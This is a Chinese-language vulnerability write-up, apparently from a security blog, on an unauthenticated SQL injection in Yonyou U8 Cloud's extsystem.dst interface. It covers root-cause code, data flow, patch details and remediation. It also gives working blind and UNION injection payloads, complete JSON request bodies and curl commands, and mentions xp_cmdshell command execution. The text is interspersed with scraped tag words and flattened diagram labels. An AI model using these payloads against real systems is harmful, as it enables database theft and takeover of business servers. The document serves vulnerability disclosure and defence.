---
title: "用友U8Cloud extsystem.dst 接口SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-u8c-extsystem-dst-sqli.html
asset_dir: embedded-base64
---

# 一、漏洞概述

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "标签：用友") U8 Cloud 是一款面向中型企业的云 ERP 系统，涵盖了财务、供应链、生产制造及人力资源管理等多个核心业务领域，是企业数字化转型的重要基础设施。

脚本语言

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "标签：用友") U8 Cloud 的 XChangeServlet 接口存在 [SQL 注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5 "标签：SQL 注入")[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。该漏洞的成因在于系统在处理客户端请求时，未能对传入 extsystem.dst 接口的特定参数进行有效的过滤与转义处理。未经授权的攻击者可以通过构造恶意的 SQL 语句并通过该接口发送请求，从而绕过系统的安全校验，实现对后端[数据](#)库的非法查询与操作。此漏洞可能导致敏感数据泄露、数据库内容被恶意篡改，在特定情况下，攻击者甚至可能利用数据库权限获取服务器进一步控制权，对业务系统的完整性与可用性构成严重威胁。

| 项目 | 内容 |
| --- | --- |
| **漏洞名称** | 用友U8Cloud extsystem.dst 接口 SQL 注入漏洞 |
| **影响版本** | 2.6 / 2.7 / 2.65 / 3.0 / 3.1 / 3.2 / 3.5 / 3.6 / 3.6sp / 5.0 / 5.0sp / 5.1 / 5.1sp |
| **漏洞类型** | SQL 注入 (CWE-89) |
| **认证需求** | **无需认证** — 接口无任何鉴权机制 |
| **风险等级** | **严重 (Critical)** |
| **补丁名称** | patch\_V2.6-5.1sp\_extsystem.dst接口存在SQL注入漏洞的补丁\_chengxlk\_20260724 |
| **补丁校验码** | 556896effa1017ed8bb7644e74a4956ba54f7e5fdc7514b7d340f369278b0528 |
| **官方公告** | [用友安全公告 #792](https://security.yonyou.com/#/noticeInfo?id=792) |

# 二、漏洞位置

## 2.1 接口入口

- **URL**: `/u8cloud/extsystem/dst/*`
- **Servlet**: `nc.bs.framework.server.extsys.ExtSystemInvokerServlet` (fw.jar)
- **服务类**: `u8c.server.extsystem.ExtSystemInvokeServer` (api.jar)
- **适配器**: `u8c.server.extsystem.adapter.dst.DSTAdapter` (api.jar)

## 2.2 Web 配置 (web.xml)

```
<servlet-mapping>
    <servlet-name>ExtSystemInvokerServlet</servlet-name>
    <url-pattern>/u8cloud/extsystem/dst/*</url-pattern>
</servlet-mapping>
```

## 2.3 关键文件清单

| 文件 | 类 | 说明 |
| --- | --- | --- |
| `external/lib/fw.jar` | `ExtSystemInvokerServlet` |

深入探索

博客资源与服务

计算机科学

字典与百科全书

Blog

网安

VPN

软件实用程序

data

 HTTP 请求入口，URL 路由 |
| `external/lib/fw.jar` | `ExtSystemServerEnum` | 枚举 `DST("/u8cloud/extsystem/dst", "u8cloud_extsystem")` |
| `modules/uap/META-INF/lib/api.jar` | `ExtSystemInvokeServer` | 服务调度，路由到 DSTAdapter |
| `modules/uap/META-INF/lib/api.jar` | `DSTAdapter` | DST 请求处理，解析 JSON，**无鉴权** |
| `modules/uap/META-INF/lib/api.jar` | `ExtSysInvokeImpl` | 反射调用业务实现类 |
| `modules/uap/lib/pubapi.jar` | `DBSqlInUtil` | **漏洞核心** — SQL IN 子句构造函数 |
| `modules/uap/lib/pubapi.jar` | `AbstractFillSingleValueBySqlExchangeRule` | SQL 填充规则基类，调用 DBSqlInUtil |
| `modules/uap/lib/pubapi.jar` | `AbstractSaveExtsystemData` | 业务保存抽象基类 |
| `modules/uap/lib/pubapi.jar` | `DSTBillTypeServerEnum` | 电商通单据类型枚举 |
| `modules/so/META-INF/lib/so.jar` | `SaleOrderSaveDstDataImpl` | 销售日报业务实现 |
| `modules/so/META-INF/lib/so.jar` | `SaleOrderCorpBySaleStruFillRule` | 销售日报公司填充规则（含 SQL 查询） |
| `modules/arap/META-INF/lib/arap.jar` | `ConvertDSTData2U8CReceiptDataImpl` | 收款日报业务实现 |
| `modules/arap/META-INF/lib/arap.jar` | `DstReceiptCorpBySaleStruFillRule` | 收款日报公司填充规则（含 SQL 查询） |
| `modules/arap/META-INF/lib/arap.jar` | `DstReceiptHbbmFillRule` | 收款日报货补部门填充规则（含 SQL 查询） |

# 三、代码审计分析

## 3.1 HTTP 请求处理流程

URL 前缀匹配 ExtSystemServerEnum.DST

new DSTAdapter

读取 JSON 请求体

DSTBillTypeServerEnum.valueOf

反射实例化 ISaveExtSystemData

convert → excRules

queryData

queryData

queryData

HTTP POST /u8cloud/extsystem/dst/

ExtSystemInvokerServlet.doAction

ExtSystemInvokeServer.doAction

DSTAdapter.doPost

🔴 无认证区域

解析 exbilltype

获取 className

ExtSysInvokeImpl.call

SaleOrderSaveDstDataImpl /  
ConvertDSTData2U8CReceiptDataImpl

ExchangeRule 规则链

SaleOrderCorpBySaleStruFillRule

DstReceiptCorpBySaleStruFillRule

DstReceiptHbbmFillRule

DBSqlInUtil.getInStr  
🔴 SQL 注入点

BaseDAO.executeQuery  
🔴 SQL 执行

## 3.2 无认证确认

`DSTAdapter.doPost()` 方法中**完全没有认证/鉴权检查**：

```
// DSTAdapter.doPost() — 直接读取请求体，无认证
public void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
    BufferedReader reader = new BufferedReader(
        new InputStreamReader((InputStream)request.getInputStream(), "utf-8"));
    String reqStr = IOUtil.toString((Reader)reader);
    // ... JSON 解析，无任何 auth 检查 ...
    JSONObject jsObj = JSONObject.fromObject((Object)reqStr);
    Object exbilltype = jsObj.get("exbilltype");
    // ... 直接执行业务逻辑 ...
}
```

**HTTP 验证结果**：未携带任何认证 Cookie/Token 的请求返回 `HTTP 200`，接口完全对外开放。

编程

## 3.3 SQL 注入根因分析

**核心[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")代码**位于 `u8c.bs.utils.DBSqlInUtil.getInStr()` (pubapi.jar)：

```
private static String getInStr(String fieldName, String[] pks, int start, int end) {
    start = Math.min(start, end);
    end = Math.max(start, end);
    StringBuffer sb = new StringBuffer();
    sb.append(" ");
    sb.append(fieldName);
    sb.append(" in (");
    String key = null;
    for (int i = start; i < pks.length && i <= end; ++i) {
        if (pks[i] == null) continue;
        key = pks[i].trim();           // ← 用户输入仅做 trim()
        sb.append("'");
        sb.append(key);                // ← 直接拼接到 SQL，无任何转义！
        sb.append("',");
    }
    String inStr = sb.substring(0, sb.length() - 1) + ") ";
    return inStr;
}
```

**关键问题**：`pks[i]` 的值直接来自于用户提交的 JSON 字段，仅经过 `trim()` 处理，**没有任何 SQL 转义或参数化**。

## 3.4 数据流追踪

SQL ServerDBSqlInUtilCorpBySaleStruFillRule(extends AbstractFillSingleValueBySqlExchangeRule)ConvertReceiptDataImplDSTAdapter攻击者SQL ServerDBSqlInUtilCorpBySaleStruFillRule(extends AbstractFillSingleValueBySqlExchangeRule)ConvertReceiptDataImplDSTAdapter攻击者无认证检查, 直接读取请求体org\_code → org\_code (映射保持不变)提取用户输入的 org\_code 值传入用户值数组 ["恶意payload"]🔴 SQL 注入发生区域直接拼接: sb.append(values[i])无任何转义或参数化！WHERE csalestruid IN (恶意payload)注入代码在数据库端执行POST JSON payload (org\_code 含注入)save(json)convert(json) 字段映射excRules → process(data)headJson.getString("org\_code")queryData(headFields, viewSQL, headValues.toArray())getInStr(fieldName, values, true)执行拼接后的 SQL返回查询结果 (或被注入代码影响)Map 结果处理后的 JSON业务处理结果JSON 响应 (含错误信息或注入结果)

## 3.5 可注入的字段

通过分析所有继承 `AbstractFillSingleValueBySqlExchangeRule` 的规则类，以下是可直接注入的字段：

黑客与破解

### 销售日报路径 (exbilltype: rm\_dailyreport)

| 规则类 | SQL 查询表 | 注入字段 (JSON) | 映射来源 |
| --- | --- | --- | --- |
| `SaleOrderCorpBySaleStruFillRule` | `bd_salestru` | `org_code` → `csalecorpid` | 请求 JSON [data](#).org\_code |
| `SaleOrderBusitypeExchangeRule` | 通过 `QueryIDMappingUtil` 查询 | `trantype_code` → `cbiztype` | 请求 JSON data.trantype\_code |

### 收款日报路径 (exbilltype: rm\_gatherdailyreport)

| 规则类 | SQL 查询表 | 注入字段 (JSON) | 映射来源 |
| --- | --- | --- | --- |
| `DstReceiptCorpBySaleStruFillRule` | `bd_salestru` | `org_code` | 请求 JSON data.org\_code |
| `DstReceiptHbbmFillRule` | `bd_cumandoc` | `customer_code` → `hbbm` | 请求 JSON data.customer\_code |

漏洞类

数据库表

SQL注入规则

转换规则\_字段映射

用户JSON输入

IN 子句注入

IN 子句注入

IN 子句注入

executeQuery

executeQuery

org\_code  
(公司编码)

customer\_code  
(客户编码)

trantype\_code  
(业务类型)

DstReceiptConvertExchangeRule  
org\_code → org\_code

DstReceiptConvertExchangeRule  
customer\_code → hbbm

DstDataSaleOrderConvertExchangeRule  
org\_code → csalecorpid

DstDataSaleOrderConvertExchangeRule  
trantype\_code → cbiztype

DstReceiptCorpBySaleStruFillRule  
🔴 注入点 #1

DstReceiptHbbmFillRule  
🔴 注入点 #2

SaleOrderCorpBySaleStruFillRule  
🔴 注入点 #3

bd\_salestru  
销售组织结构表

bd\_cumandoc  
客户档案表

DBSqlInUtil.getInStr()  
🔴 字符串拼接SQL  
无参数化

## 四、测试环境验证 🔴 (已实测确认)

## 4.1 测试环境信息

| 项目 | 值 |
| --- | --- |
| **服务器地址** | `http://127.0.0.1:8088` |
| **中间件** | Apache Tomcat/7.0.79 |
| **[数据](#)库** | Microsoft SQL Server 2012+ @ 127.0.0.1:1433 |
| **数据库名** | `U8CLOUD` |
| **数据库用户** | `sa` (管理员权限) |
| **JDWP 调试端口** | `127.0.0.1:5006` |
| **Java 版本** | 1.7.0\_141 HotSpot 64-Bit |

> 数据库凭据来自 `ierp/bin/prop.xml`，通过 JDWP 条件盲注确认当前用户为 `sa`。

## 4.2 HTTP 可达性验证 ✅

```
# 无认证请求 — 返回 200 OK
$ curl -s -o /dev/null -w "%{http_code}" -X POST \
  "http://127.0.0.1:8088/u8cloud/extsystem/dst/" \
  -H "Content-Type: application/json" \
  -d '{"exbilltype":"rm_dailyreport","bill":[]}'

200
```

## 4.3 SQL 注入盲注实测 🔴 (确认可利用)

### 测试1: WAITFOR DELAY 时间盲注

| 测试 | Payload | 响应时间 | Delta | 结论 |
| --- | --- | --- | --- | --- |
| 基准 | `org_code: "BASELINE"` | **0.287s** | — | 正常请求 |
| 注入 | `org_code: "x') WAITFOR DELAY '0:0:3' --"` | **3.326s** | **+3.039s** | ✅ 注入成功 |

### 测试2: 条件盲注 (IF 语句)

| 条件 | Payload | 响应时间 | 结论 |
| --- | --- | --- | --- |
| `SYSTEM_USER LIKE 'sa%'` (真) | `x') IF SYSTEM_USER LIKE 'sa%' WAITFOR DELAY '0:0:4' --` | **4.279s** | ✅ DB用户确认为 `sa` |
| `SYSTEM_USER LIKE 'FAKE%'` (假) | `x') IF SYSTEM_USER LIKE 'FAKE%' WAITFOR DELAY '0:0:4' --` | **0.274s** | ✅ 条件为假不延迟 |

### 测试3: 多注入点验证

| # | exbilltype | 注入字段 | Payload | 响应时间 | 状态 |
| --- | --- | --- | --- | --- | --- |
| 1 | `rm_gatherdailyreport` | `org_code` | `x') WAITFOR DELAY '0:0:3' --` | **3.326s** | ✅ |
| 2 | `rm_gatherdailyreport` | `customer_code` | `x') WAITFOR DELAY '0:0:3' --` | **3.286s** | ✅ |
| 3 | `rm_dailyreport` | `org_code` | `x') WAITFOR DELAY '0:0:3' --` | **6.135s** | ✅ (head+body双查询) |

> Sale Order 路径延迟 6s 是因为 `SaleOrderCorpBySaleStruFillRule` 对 head 和 body 各独立执行一次 SQL 查询（分别注入 `WAITFOR DELAY`）。

多注入点

条件盲注

盲注测试

基准测试

差异 +3.0s

条件可控

条件可控

注入点1

注入点2

注入点3

BASELINE  
⏱ 0.287s

WAITFOR DELAY 3s  
⏱ 3.326s  
+3.039s

IF SYSTEM\_USER EQ sa  
⏱ 4.279s  
✅ DB 用户确认为 sa

IF SYSTEM\_USER EQ FAKE  
⏱ 0.274s  
✅ 条件为假不延迟

Receipt org\_code  
⏱ 3.326s

Receipt customer\_code  
⏱ 3.286s

SaleOrder org\_code  
⏱ 6.135s  
head+body 双查询

### 测试curl命令示例

```
# 基准请求
curl -s -X POST "http://127.0.0.1:8088/u8cloud/extsystem/dst/" \
  -H "Content-Type: application/json" \
  -d '{"exbilltype":"rm_gatherdailyreport","bill":[{"data":{
    "org_code":"BASELINE","customer_code":"test","dept_code":"test",
    "vouchdate":"2024-01-01","details":[{"payment_code":"test","money":"100"}]
  }}]}'

# WAITFOR DELAY 盲注 (响应延迟 ~3秒)
curl -s -X POST "http://127.0.0.1:8088/u8cloud/extsystem/dst/" \
  -H "Content-Type: application/json" \
  -d '{"exbilltype":"rm_gatherdailyreport","bill":[{"data":{
    "org_code":"x'"'"') WAITFOR DELAY '"'"'0:0:3'"'"' --",
    "customer_code":"test","dept_code":"test",
    "vouchdate":"2024-01-01","details":[{"payment_code":"test","money":"100"}]
  }}]}'
```

## 4.4 JDWP 调试追踪验证 ✅

通过 JDWP 远程调试（端口 5006），在 `ExtSystemInvokeServer.doAction()` 设置断点，确认请求完整路由到 DST 适配器：

计算机安全

```
Breakpoint hit at u8c.server.extsystem.ExtSystemInvokeServer:28
  pathInfo = "/u8cloud/extsystem/dst/"
  → 路由到 DSTAdapter.doPost()
```

# 五、攻击场景分析

## 5.1 注入 Payload 构造

由于漏洞点位于 `IN ('value')` 子句中，攻击者可以通过闭合单引号逃逸：

**原始 SQL 结构**:

```
SELECT viewname.Fields[0], viewname.Fields[3]
FROM (base_query) viewname
WHERE viewname.Fields[0] IN ('USER_INPUT')
```

**注入 Payload** (SQL Server 环境):

数据管理

```
' ) UNION SELECT name,@@version FROM sys.databases --
```

**注入后的 SQL**:

```
SELECT viewname.csalestruid, viewname.belongcorp
FROM (select belongcorp,csalestruid from bd_salestru
      where dr=0 and isuseretail='Y') viewname
WHERE viewname.csalestruid IN ('')
UNION SELECT name,@@version FROM sys.databases -- ')
```

## 5.2 SQL Server 盲注 Payload

针对 SQL Server 环境，可利用时间盲注：

```
' ) WAITFOR DELAY '0:0:5' --
```

完整 JSON Payload:

网络安全

```
{
  "exbilltype": "rm_gatherdailyreport",
  "bill": [{
    "data": {
      "dept_code": "test",
      "org_code": "' ) WAITFOR DELAY '0:0:5' -- ",
      "customer_code": "test",
      "vouchdate": "2024-01-01",
      "dwbm": "1001",
      "details": [{"payment_code": "test", "money": "100"}]
    }
  }]
}
```

## 5.3 攻击影响

攻击影响

数据窃取

用户信息泄露

财务数据窃取

业务机密外泄

通过 UNION 注入读取任意表

权限提升

读取管理员凭证

破解密码哈希

获取 sa 账户完全控制权

数据篡改

堆叠查询修改记录

删除审计日志

插入后门数据

命令执行

xp\_cmdshell 启用后 RCE

操作系统级控制

横向移动至内网

1. **[数据](#)窃取**: 通过 UNION 注入读取任意数据库表数据（用户信息、财务数据等）
2. **权限提升**: 可能读取管理员凭证
3. **数据篡改**: 结合堆叠查询可能修改数据库记录
4. **命令执行**: 若 SQL Server 启用 `xp_cmdshell`，可执行操作系统命令

# 六、漏洞成因总结

导致

导致

导致

加剧

🔴 根因 #1  
缺少认证

💥 extsystem.dst  
SQL 注入漏洞

🔴 根因 #2  
信任用户输入

🔴 根因 #3  
字符串拼接SQL  
无参数化查询

🟡 根因 #4  
缺少输入验证  
仅 trim 无过滤/转义

数据窃取

权限提升

数据篡改

命令执行 RCE

# 七、修复建议

## 7.1 紧急修复（推荐）

将 `DBSqlInUtil.getInStr()` 方法改为使用 `PreparedStatement` 参数化查询：

脚本语言

```
// 修复方案示意：使用参数化查询替代字符串拼接
private static String getInStr(String fieldName, String[] pks, int start, int end) {
    // 使用 ? 占位符替代直接拼接
    StringBuilder sb = new StringBuilder();
    sb.append(" ").append(fieldName).append(" in (");
    for (int i = start; i < pks.length && i <= end; ++i) {
        if (pks[i] == null) continue;
        sb.append("?,");
    }
    return sb.substring(0, sb.length() - 1) + ") ";
}
```

## 7.2 防御加固

1. **添加认证**: 在 `DSTAdapter.doPost()` 入口增加身份认证和授权检查
2. **输入验证**: 对所有用户输入的字段值进行白名单校验
3. **SQL 参数化**: 全量审查 `DBSqlInUtil` 及所有 SQL 构造工具类
4. **应用安全补丁**: 使用 U8C 安全补丁升级工具安装官方补丁

## 7.3 官方补丁

```
补丁名称: patch_V2.6-5.1sp_extsystem.dst接口存在SQL注入漏洞的补丁_chengxlk_20260724
校验码:   556896effa1017ed8bb7644e74a4956ba54f7e5fdc7514b7d340f369278b0528
```

# 八、审计结论

该漏洞为**严重级别的 [SQL 注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5 "标签：SQL 注入")漏洞**，已在测试环境**实测确认可利用**：

- ✅ **无需认证**: 接口完全对外开放，无任何鉴权（HTTP 200）
- ✅ **[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5 "标签：SQL注入")实测确认**: `WAITFOR DELAY` 盲注精确控制响应时间（基准 0.29s vs 注入 3.33s）
- ✅ **条件盲注确认**: IF 语句条件注入成功区分真假条件（4.28s vs 0.27s）
- ✅ **数据库用户确认**: 当前连接使用 `sa` 管理员账户
- ✅ **多注入点确认**: `rm_gatherdailyreport` 路径 2 个字段 + `rm_dailyreport` 路径 1 个字段
- ✅ **代码根因确认**: `DBSqlInUtil.getInStr()` 字符串拼接 SQL，无参数化
- ✅ **数据流确认**: 用户 JSON → DSTAdapter → ExchangeRule → `getInStr()` → `BaseDAO.executeQuery()`

**建议立即**应用官方安全补丁，并在此前通过 WAF/防火墙限制对 `/u8cloud/extsystem/dst/*` 路径的外部访问。

编程

SQL Server (sa)DBSqlInUtil(pubapi.jar)AbstractFillSingleValueBySqlExchangeRuleSaleOrderSaveDstDataImpl /ConvertDSTData2U8CReceiptDataImplExtSysInvokeImpl(api.jar)DSTAdapter(api.jar)ExtSystemInvokeServer(api.jar)ExtSystemInvokerServlet(fw.jar)Tomcat :8188攻击者SQL Server (sa)DBSqlInUtil(pubapi.jar)AbstractFillSingleValueBySqlExchangeRuleSaleOrderSaveDstDataImpl /ConvertDSTData2U8CReceiptDataImplExtSysInvokeImpl(api.jar)DSTAdapter(api.jar)ExtSystemInvokeServer(api.jar)ExtSystemInvokerServlet(fw.jar)Tomcat :8188攻击者枚举匹配DST("/u8cloud/extsystem/dst")🔴 无认证检查！直接读取 JSON 请求体🔴🔴 核心漏洞区域getInStr 直接拼接:sb.append(userInput)WAITFOR DELAY 被执行系统用户确认为 saPOST /u8cloud/extsystem/dst/JSON: org\_code = SQL注入payload路由到 ExtSystemInvokerServletdoAction(request, response)new DSTAdapter().doPost()call(className, rawJson)反射实例化 save(rawJson)convert() 字段映射excRules → process(data)headJson.get(注入字段)提取用户输入值queryData(fields, view, values[])SELECT ... WHERE col IN (恶意payload)查询结果Map 结果集处理后的数据业务结果JSON 响应(响应时间可被盲注操控)

---
